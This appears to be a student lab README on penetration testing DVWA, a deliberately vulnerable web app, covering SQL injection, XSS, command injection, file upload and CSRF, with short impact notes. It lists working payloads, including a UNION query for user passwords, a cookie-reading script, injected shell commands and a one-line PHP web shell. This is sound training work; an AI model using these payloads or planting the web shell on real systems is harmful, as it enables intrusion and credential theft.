
 DVWA Web Application Penetration Testing Project

 Overview
This project demonstrates penetration testing on DVWA (Damn Vulnerable Web Application). It focuses on identifying common web vulnerabilities and understanding how attackers exploit them.

---

 Objectives
- Understand web application vulnerabilities
- Perform real-world attack simulations
- Gain hands-on cybersecurity experience
- Learn mitigation techniques

---

 Tools Used
- Kali Linux
- DVWA
- Apache Server
- MySQL
- Burp Suite
- John the Ripper

---

Methodology

1. Installed DVWA on Kali Linux
2. Configured Apache and MySQL services
3. Set DVWA security level to LOW
4. Explored vulnerability modules
5. Performed attacks manually
6. Captured screenshots
7. Analyzed impact and mitigation

---

 Vulnerabilities & Attacks

---

 SQL Injection

**Payloads Used:**
1' OR '1'='1
1' UNION SELECT user,password FROM users #


**Description:**
SQL Injection allows attackers to manipulate database queries.

**Impact:**
- Unauthorized data access
- Database compromise

---

 Cross-Site Scripting (XSS)

**Payloads Used:**
<script>alert('XSS')</script> <script>document.write(document.cookie)</script>

**Description:**
Allows execution of malicious scripts in user browser.

**Impact:**
- Session hijacking
- Cookie theft
---

 Command Injection

**Payloads Used:**
127.0.0.1; ls
127.0.0.1; whoami


**Description:**
Allows execution of system commands.

**Impact:**
- Server compromise
- Unauthorized access

---
File Upload Vulnerability

**Payload:**
 php
<?php system($_GET['cmd']); ?>
Description:
Allows uploading malicious files.

Impact:
Remote command execution
Full server control

6️ CSRF (Cross-Site Request Forgery)

Description:
Allows attackers to perform actions without user consent.

Impact:
Account takeover
Unauthorized changes

Results
All vulnerabilities were successfully exploited in DVWA. The project demonstrates how insecure coding practices can lead to serious security risks.

Conclusion
This project provided practical exposure to real-world web vulnerabilities. It highlights the importance of secure coding, proper validation, and strong authentication mechanisms.
